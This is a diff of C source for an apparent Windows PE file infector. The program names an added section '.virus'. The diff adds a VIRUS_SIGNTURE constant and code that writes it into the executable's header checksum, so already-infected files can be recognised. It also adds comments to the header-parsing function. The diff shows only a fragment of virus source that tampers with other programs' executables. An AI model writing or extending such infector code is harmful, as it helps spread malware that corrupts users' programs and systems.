@@ -4,7 +4,9 @@
 
 #define ERROR -1
 #define SUCCESS 0
+
 #define INFECTED_SECTION_NAME ".virus"
+#define VIRUS_SIGNTURE 0x1234
 
 #pragma warning(disable : 4996)
 
@@ -16,7 +18,11 @@ DWORD align(DWORD size, DWORD align, DWORD addr) {
 
 DWORD set_exe_headers(EXE_file* exe_file)
 {
-    /* Set the exe headers for future usage*/
+    /// <summary>
+    /// Set the exe headers for future usage
+    /// </summary>
+    /// <param name="exe_file"></param>
+    /// <returns> function status </returns>
     PIMAGE_SECTION_HEADER first_section_header = NULL;
     exe_file->dosHeader = exe_file->mapped_handle;
     DWORD relocation_table_end = 0;
@@ -27,7 +33,6 @@ DWORD set_exe_headers(EXE_file* exe_file)
         return ERROR;
     }
     exe_file->headers = exe_file->mapped_handle + exe_file->dosHeader->e_lfanew;
-
 
     if (exe_file->headers->Signature != IMAGE_NT_SIGNATURE)
     {
@@ -40,6 +45,10 @@ DWORD set_exe_headers(EXE_file* exe_file)
         printf("this program is not 32 bit \n");
         return ERROR;
     }
+
+    // the infector would know that the program has been infect.
+    exe_file->headers->OptionalHeader.CheckSum = VIRUS_SIGNTURE;
+
     exe_file->entry_address = (DWORD)exe_file->headers->OptionalHeader.ImageBase + exe_file->headers->OptionalHeader.AddressOfEntryPoint;
     return SUCCESS;
 }
